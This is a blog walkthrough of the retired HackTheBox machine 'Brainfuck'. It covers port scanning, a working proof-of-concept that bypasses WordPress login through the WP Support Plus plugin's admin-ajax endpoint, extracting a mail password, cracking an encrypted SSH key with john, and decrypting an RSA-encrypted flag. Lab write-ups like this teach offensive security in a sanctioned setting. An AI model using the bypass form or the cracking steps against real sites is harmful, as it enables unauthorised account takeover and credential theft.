---
author: "faizul"
title: "Brainfuck - Retired HackTheBox Machine"
date: 2020-8-1T12:00:06+09:00
description: "Brainfuck Machine Writeup"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: faizul
image: images/htb/htb.png
tags: 
- pentest
- retired
- hackthebox
---

![f3228c6ac0dd58acfc3bc59941a9ed70.png](/images/htb/tenten/0083c016fd30415f850dad7d6176e812.png)

- 10.10.10.17


## Recon

### Nmap
Start the nmap scan with `sudo nmap -sCV -T4 -oA nmap/open-ports -iL ip`. This will check the open ports on targeted 


### Result discussions/note

- 22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
- 25/tcp  open  smtp     Postfix smtpd
- 110/tcp open  pop3     Dovecot pop3d
- 143/tcp open  imap     Dovecot imapd
- 443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
	- DNS:www.brainfuck.htb
	- DNS:sup3rs3cr3t.brainfuck.htb
	- DNS:brainfuck.htb

To summarized and beautify the nmap output, i filtered the output so that it is easier to analyze. There are 5 open ports which is **SSH** which is port **22**. This service runs on latest version and doesnt contain vulnerabilities. Another 2 familiar open service are **pop3** on port **25** and **imap** on port **110**. Last we got this **HTTPS** port on **443**. Other than that, there is list of **DNS* included on nmap scan, so lets add this to our */etc/hosts*. 

### Enumeration
Browse www.brainfuck.htb and sup3rs3cr3t.brainfuck.htb and grab whatever we can to gain initial access.

![1652f9e7c67c0d1ece156bb84040b371.png](/images/htb/tenten/948add39570044c4bc9b6a400cccc2e1.png)


![e23b343b9a7b80d83c42971f36ab80fc.png](/images/htb/tenten/d122d2de84bb44d1b329dbe4ef9dce4e.png)

www.brainfuck.htb gave us hint that this web app is a Wordpress web app. Since this is HTTPS or 443, we can take a good look at certificate and inspect more. 

![6a611376a1a9773247d874d313dfeaff.png](/images/htb/tenten/a745fb5f0682409c9ad285fef421688c.png)



## Initial Foothold / Initial Access

### Searchsploit exploit
Since the vulnerabilities that appears the most on wpscan result is `WP Support Plus Responsive Ticket System`, lets search this on searchsploit using this command. `searchsploit WP Support Plus Responsive Ticket System`

![59edff135895c012783b45219b6c05e1.png](/images/htb/tenten/34b9c05a8e984f1da4296f2ae79e7bcc.png)

Then, get this on local directory using `searchsploit -m 41006`. This will copy or mirror of 41006 exploit on local directory for our usage.



```php
1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```
The exploit for this is basically where we just need username of a valid login without password. Lets enumerate the username for login in this wordpress site. 


### Username enumeration

```
[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

Next, we going to make new html file and use the code from searchsploit to login as admin in Wordpress site. Copy this code, edit the value of `value="administrator"` and `action="http://wp/wp-admin/admin-ajax.php"`
```html
<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

After that, open this on browser and we will get this kind of output.


![6755bd752586505ae6f13aa524d14d7b.png](/images/htb/tenten/5e2c170cd21b4fd395da789474a2988e.png)


Press login and we will open the brainfuck.htb site with us logged in as admin. 



![caf431667d5f651972e60fa3accf1564.png](/images/htb/tenten/32de80cdd62b4c97972ca95afe7889c7.png)

Since we have SMTP, POP3 and IMAP, we going to find the setup on Wordpress plugin. Hover the cursor to Brainfuck Ltd and click theme. After that, click Plugins and we will find `Easy WP SMTP`



![4ffca760db221ca0dbcfc1f3469afc21.png](/images/htb/tenten/515675597d84425baee7a5f8ccaf0139.png)


There is a setup with password here. We can use inspect elements to get the password. 



![6ff34be3530da115fb096509c105dfab.png](/images/htb/tenten/ce44d837b4e1484b824b5eadd629bcfc.png)


Next, we going to setup `orestis@brainfuck.htb` email on our mail client as follows. 



![7e5d97cd3a746c81380ef234383fe386.png](/images/htb/tenten/03b321f1ab424dfb9c1df4b51d7c4d7d.png)



![62e20e750cc1719da26c2155c15325ad.png](/images/htb/tenten/78305314e3164f2397fc6a7fcc925abb.png)



![d9b570b04f75dddb6ef4e0427efaf3b4.png](/images/htb/tenten/7ec3a38ce14440f0bc90cc37f7aef755.png)




![b73babcc201fa896e6438e66167378b7.png](/images/htb/tenten/1cd0b78dbb4a48ccbc20335b8a0db1a4.png)



![4aa28097ee1d1527420100ef3e39d901.png](/images/htb/tenten/a3dd26a323324338ad9c13d0aa04b055.png)




![f1e095202bc12a6e8ea05502ddf5a35a.png](/images/htb/tenten/c57d9c88f23f4d2e8e0a00a7f0e6074e.png)



![a211eb5757f808fbc7356b8adef21490.png](/images/htb/tenten/a0137d264c794178a03729619c6208ad.png)


Login to supers3cr3t forum and read all the gibberish talk between oretis and admin. 

![d8df2797ed6b8f4ca8ebd660ebb73d25.png](/images/htb/tenten/a9d198ef62314ba5ab762b1c8f9448d2.png)



![27f1837dee5aba3031f4019d160882e2.png](/images/htb/tenten/f333dee5faa04e2e86bfd863db7bcfeb.png)




![5cc0b4122baec975f4ba1dd07b1a66fd.png](/images/htb/tenten/63d8f25065f347bcae1f7767b70ccdc2.png)

- Get key for decipher 
	- compare clear text vs cipher text to get key
	```python
	plaintext = "OrestisHackingforfunandprofit"
	ciphertext = "PieagnmJkoijegnbwzwxmlegrwsnn"
	key = ""
	for i in range(len(plaintext)):
		num_key = ((ord(ciphertext[i]) - ord(plaintext[i])) % 26) + 97
		char_key = chr(num_key)
		key = key + char_key
		print key
	```
	
	- result
	```
	fuckmybrain
	```
- decrypt cipher with key on cryptii.com with `result` as passphrase


![50a3e962f7c676c7fcbf9c0bac3295f3.png](/images/htb/tenten/eb9f543bc0db4c738bdfdb257bae3cbc.png)

```
There you go you stupid fuck, I hope you remember your key password because I dont :)

https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

- Follow link and get ssh private key

![7abbe1a0a9982539464420a587a7a09b.png](/images/htb/tenten/99cfc5a8817d46249aab22e46a0f6d6e.png)


Encrypted sshkey. 




- convert rsa to john using rsa2john
first, git clone `https://github.com/stricture/hashstack-server-plugin-jtr`. then run `python hashstack-server-plugin-jtr/scrapers/sshng2john id_rsa > ssh-key-for-john`. After that, run john to crack this. `sudo john --wordlist=/usr/share/wordlist/rockyou.txt loot/ssh-key-for-john | tee loot/cracked-john`

```bash
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
3poulakia!       (loot/id_rsa)
```

We cracked the password, now, lets login to ssh using the id_rsa and password. First, change id_rsa permission to 600 using `chmod 600 id_rsa`

- ssh using rsa + key
`ssh -i loot/id_rsa orestis@brainfuck.htb`

- get user
`cat users.txt`


### Priv-Esc
Found this file on server. This will encrypt root.txt.

```python
nbits = 1024                                                                    

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```


Some RSA encruption shit, found this cool script.


```pyhton
import binascii, base64       

p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307       
                
q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079       
                
e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997       
                
ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182       
                
def egcd(a, b):       
    x,y, u,v = 0,1, 1,0       
    while a != 0:       
        q, r = b//a, b%a       
        m, n = x-u*q, y-v*q       
        b,a, x,y, u,v = a,r, u,v, m,n       
        gcd = b       
    return gcd, x, y       
                
n = p*q #product of primes       
phi = (p-1)*(q-1) #modular multiplicative inverse       
gcd, a, b = egcd(e, phi) #calling extended euclidean algorithm
d = a #a is decryption key       

out = hex(d)       
print("d_hex: " + str(out));       
print("n_dec: " + str(d)); 
pt = pow(ct, d, n)       
print("pt_dec: " + str(pt))       
out = hex(pt)       
out = str(out[2:-1])       
print "flag"       
print out.decode("hex")
```

on debug.txt, replace p with first line of value, q with second line of value, e with third line of value and ct with output.txt value. 